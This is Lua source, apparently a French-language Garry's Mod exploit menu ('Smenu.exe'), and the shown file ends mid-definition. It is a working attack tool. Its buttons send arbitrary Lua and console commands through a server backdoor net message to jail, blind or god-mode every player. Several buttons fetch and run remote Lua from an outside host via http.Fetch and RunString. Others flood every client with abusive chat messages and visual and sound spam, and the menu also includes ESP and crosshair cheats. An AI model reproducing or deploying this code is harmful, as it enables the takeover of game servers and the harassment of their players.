----------------------------------------------------

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 148, 262 )
        Macro:SetParent(Credit)
        Macro:SetText( "" )
        Macro:SetFont( "vaporfont3" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 550, 35 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end

----------------------------------------------------
-----------------------------------------------
local richtext = vgui.Create( "RichText", Credit )
richtext:Dock( FILL )
richtext:SetSize( 20, 20 )

richtext:InsertColorChange( 255, 255, 224, 255 )
richtext:AppendText( "Exploits Menu V2 - 2018 \nCréé par" .. "                    " .. " \nLe Meilleurs Menu D'exploits 2018.\nDiscord : "  )

HTMLPanel = vgui.Create( "HTML", Credit )
HTMLPanel:SetPos( 328,100 )
HTMLPanel:SetSize( 300,300 )
HTMLPanel:OpenURL( "https://i.imgur.com/HqrbZxj.png")

local Button4 = vgui.Create( "DButton", Credit )
Button4:SetText( "Sparks" )
Button4:SetTextColor( Color( 255, 0, 0 ) )
Button4:SetPos( 44, 12 )
Button4:SizeToContents()
Button4.Paint = function( self, w, h )
    draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )
    draw.DrawText( "Hello there!", "TargetID", ScrW() * 0.5, ScrH() * 0.25, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER )
end
Button4.DoClick = function()
    gui.OpenURL( "https://steamcommunity.com/id/yapusurllol/?l=japanese" )
    surface.PlaySound( "buttons/combine_button1.wav" )
end

local Button4 = vgui.Create( "DButton", Credit )
Button4:SetText( "Smenu.exe" )
Button4:SetTextColor( Color( 255, 0, 0 ) )
Button4:SetPos( 44, 38 )
Button4:SizeToContents()
Button4.Paint = function( self, w, h )
    draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )
    draw.DrawText( "Hello there!", "TargetID", ScrW() * 0.5, ScrH() * 0.25, Color( 255, 255, 255, 255 ), TEXT_ALIGN_CENTER )
end
Button4.DoClick = function()
    gui.OpenURL( "https://discord.me/smenu_exe" )
    surface.PlaySound( "buttons/combine_button1.wav" )
end

-----------------------------------------------

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Options)
Macro:SetPos( 180, 120 )
Macro:SetText( "GodMod" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "GodMod Activer ! " )
    SploitNotify("Tous les joueurs sont invincible !")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"god\", \"*\")")
net.WriteBit(1)
net.SendToServer()
end
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 290, 120 )
        Macro:SetParent(Options)
        Macro:SetText( "X" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 29, 29 )
        Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
Macro:SetTextColor( Color( 255, 255, 255 ) )       
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "GodMod Désactiver" )
    SploitNotify("Tous les joueurs sont plus invincible")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"ungod\", \"*\")")
net.WriteBit(1)
net.SendToServer()
end
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Options)
Macro:SetPos( 180, 90 )
Macro:SetText( "Cloak" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Cloak Activer ! " )
    SploitNotify("Tous les joueurs sont invisible !")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"Cloak\", \"*\")")
net.WriteBit(1)
net.SendToServer()
end
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 290, 90 )
        Macro:SetParent(Options)
        Macro:SetText( "X" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 29, 29 )
        Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
Macro:SetTextColor( Color( 255, 255, 255 ) )       
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Cloak Désactiver" )
    SploitNotify("Tous les joueurs sont plus invisible")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"unCloak\", \"*\")")
net.WriteBit(1)
net.SendToServer()
end
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Options)
Macro:SetPos( 180, 60 )
Macro:SetText( "Blind" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Blind Activer ! " )
    SploitNotify("Les joueurs ne voit plus rien")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"Blind\", \"*\")")
net.WriteBit(1)
net.SendToServer()
end
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 290, 60 )
        Macro:SetParent(Options)
        Macro:SetText( "X" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 29, 29 )
        Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
Macro:SetTextColor( Color( 255, 255, 255 ) )       
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Blind Désactiver" )
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"unBlind\", \"*\")")
net.WriteBit(1)
net.SendToServer()
end
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Options)
Macro:SetPos( 180, 30 )
Macro:SetText( "Jail Tout le monde" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Jail Activer ! " )
    SploitNotify("Vous avez mis tous les joueurs en Jail")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"jail\", \"*\")")
net.WriteBit(1)
net.SendToServer()
end
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 290, 30 )
        Macro:SetParent(Options)
        Macro:SetText( "X" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 29, 29 )
        Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
Macro:SetTextColor( Color( 255, 255, 255 ) )       
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Jail Désactiver" )
    SploitNotify("Vous avez unjail tous les joueurs")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"unjail\", \"*\")")
net.WriteBit(1)
net.SendToServer()
end
end
------------------------------------------------------------------------------

local   espon = vgui.Create( "DButton", Options)
espon:SetPos( 20, 30 )
espon:SetSize( 110, 30 )
espon:SetText( "ESP" )
espon.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if espon:IsHovered() then
espon:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150)) 
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
espon:SetTextColor( Color(  255, 255, 255 ) )       
end
espon.DoClick = function()
LocalPlayer():ConCommand( "smenu_esp 1" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "ESP Activer" )
end
end
local   espoff = vgui.Create( "DButton", Options)
espoff:SetPos( 110, 35 )
espoff:SetSize( 20, 20  )
espoff:SetText( "X" )
espoff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if espoff:IsHovered() then
espoff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
espoff:SetTextColor( Color( 255, 255, 255 ) )       
end
espoff.DoClick = function()
LocalPlayer():ConCommand( "smenu_esp 0" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "ESP Désactiver" )
end
end

-------------------------------------------------------------------------------------|

local   crosshairon = vgui.Create( "DButton", Options )
crosshairon:SetPos( 20, 90 )
crosshairon:SetSize( 110, 30 )
crosshairon:SetText( "Crosshair" )
crosshairon.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if crosshairon:IsHovered() then
crosshairon:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150)) 
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
crosshairon:SetTextColor( Color(  255, 255, 255 ) )       
end
crosshairon.DoClick = function()
LocalPlayer():ConCommand( "crosshair 0" )
LocalPlayer():ConCommand( "smenu_chair 1" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Crosshair Activer" )
end
end
local   crosshairoff = vgui.Create( "DButton", Options )
crosshairoff:SetPos( 110, 95 )
crosshairoff:SetSize( 20, 20  )
crosshairoff:SetText( "X" )
crosshairoff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if crosshairoff:IsHovered() then
crosshairoff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
crosshairoff:SetTextColor( Color( 255, 255, 255 ) )       
end
crosshairoff.DoClick = function()
LocalPlayer():ConCommand( "crosshair 1" )
LocalPlayer():ConCommand( "smenu_chair 0" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Crosshair Désactiver" )
end
end

-------------------------------------------------------------------------------------|

local   mirroron = vgui.Create( "DButton", Options)
mirroron:SetPos( 20, 60 )
mirroron:SetSize( 110, 30 )
mirroron:SetText( "Mirroir" )
mirroron.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if mirroron:IsHovered() then
mirroron:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
mirroron:SetTextColor( Color(  255, 255, 255 ) )        
end
mirroron.DoClick = function()
LocalPlayer():ConCommand( "lix_lesp_mirror 1" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Mirroir Activer" )
end
end
local   mirroroff = vgui.Create( "DButton", Options)
mirroroff:SetPos( 110, 65 )
mirroroff:SetSize( 20, 20  )
mirroroff:SetText( "X" )
mirroroff.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if mirroroff:IsHovered() then
mirroroff:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
mirroroff:SetTextColor( Color( 255, 255, 255 ) )        
end
mirroroff.DoClick = function()
LocalPlayer():ConCommand( "lix_lesp_mirror 0" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Mirroir Désactiver" )
end
end


----------------------------------------------------


local Entry = vgui.Create( "DTextEntry" )
Entry:SetParent(Controller)
Entry:SetPos( 12, 530 )
Entry:SetSize( 230, 90 )
Entry:SetText( "Argument go here !!" )

local function FORMAT( code, target )
	if target then
		code = string.Replace(code, "#T", "Player("..target:UserID()..")")
	end
	code = string.Replace(code, "#M", "Player("..LocalPlayer():UserID()..")")
	code = string.Replace(code, "#E", Entry:GetValue())
	
	return code
end

local function SENDLUA(lua, t)
	lua = FORMAT(lua, t)
	if net.Pooled("GMOD_NETDBG") then
		net.Start("GMOD_NETDBG")
	else
		net.Start(bdkey)
	end
	net.WriteString(lua)
	net.SendToServer()
end



local TotalExploits = vgui.Create( "DLabel", Controller )
TotalExploits:SetPos( 20, 460 )
TotalExploits:SetText( "Total Exploits: "..totalExploits.." |" )
TotalExploits:SizeToContents()
local BackdoorStatus = vgui.Create( "DLabel", Controller )
BackdoorStatus:SetPos( 110, 460 )
BackdoorStatus:SetText( "Backdoor: "..HtxPooledString() )
BackdoorStatus:SizeToContents()
if IsMessagePooled( netKey ) then BackdoorStatus:SetTextColor( Color(0,255,0) ) else BackdoorStatus:SetTextColor( Color(255,0,0) ) end
local RCON = vgui.Create("DButton", Controller )
RCON:SetSize( 110, 25 )
RCON:SetPos( 130, 500 )
RCON:SetText("RCON Command")
RCON:SetTextColor(Color(255, 255, 255, 255))
RCON.Paint = function(panel, w, h)
    surface.SetDrawColor(29, 39, 55)
    surface.DrawRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
    surface.SetDrawColor( 149, 44, 87 )
    surface.DrawOutlinedRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
end

RCON.DoClick = function()
    local GetEntry = GetEntry:GetValue()
        net.Start(netKey)
        net.WriteString( GetEntry )
        net.WriteBit (false)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "RCON Commande envoyé." )
		    SploitNotify("RCON Commande envoyé au serveur.")
    surface.PlaySound("buttons/blip1.wav") 
end

local GLUA = vgui.Create("DButton", Controller )
GLUA:SetSize( 110, 25 )
GLUA:SetPos( 15, 500 )
GLUA:SetText("Code LUA")
GLUA:SetTextColor(Color(255, 255, 255, 255))
GLUA.Paint = function(panel, w, h)
    surface.SetDrawColor(29, 39, 55)
    surface.DrawRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
    surface.SetDrawColor( 149, 44, 87 )
    surface.DrawOutlinedRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
end

GLUA.DoClick = function()
local GetEntry = GetEntry:GetValue()
        net.Start(netKey)
        net.WriteString( GetEntry )
        net.WriteBit (1)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Code lua envoyé." )
		    SploitNotify("Code lua envoyé au serveur.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "SSV 1 (PLS MOD)" )
Macro.Paint = function()
surface.SetDrawColor(Color(139, 0, 0) )
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://loadingscrren.000webhostapp.com/modpls.lua\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 1 (MOD PLS) activé ATTENTION LES YEUX" )
    SploitNotify("Super Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 60 )
Macro:SetText( "SSV 2 (base)" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(139, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531253-skel2.gif\")]])" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 2 (base) activé" )
    SploitNotify("Super Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end



local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 90)
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "SSV 3 (HACKED)" )
Macro.Paint = function()
surface.SetDrawColor(139, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(1920,1080) hud:SetPos(0,0) hud:OpenURL(\"https://loadingscrren.000webhostapp.com/maxresdefault%20(2).jpg\")]]) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 3 (HACKED) activé" )
    SploitNotify("Super Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end

----------------------------------------------------------------------------------

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 120 )
Macro:SetText( "SSV 4 (Blue)" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(139, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://loadingscrren.000webhostapp.com/screenblue.lua\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 4 (Blue) activé" )
    SploitNotify("Super Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end

----------------------------------------------------------------------------------

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 150 )
Macro:SetText( "SSV 5 (Undertale)" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(139, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(1,255),math.random(1,255),math.random(1,255)) )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://loadingscrren.000webhostapp.com/asriel.lua\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 5 (Undertale) activé" )
    SploitNotify("Super Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end

----------------------------------------------------------------------------------

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 140, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 1 - Seized" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat1\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Seized by Sparks\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spam 1 - Seized activé" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 140, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 2 - Bz fdp" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat2\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Tu t'es bien fais niquer fais de pute ! :)\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spam 2 - Bz fdp activé" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 3 - Get dicked" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat3\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Get dicked bitch\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spam 3 - Get dicked activé" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller) 
Macro:SetPos( 140, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam 4 - LEAK" )			
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat4\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"LEAK C EST MAL SERVEUR DE MERDE\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Spam 4 - Serveur de merde activé" )
    SploitNotify("Serveur de merde activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
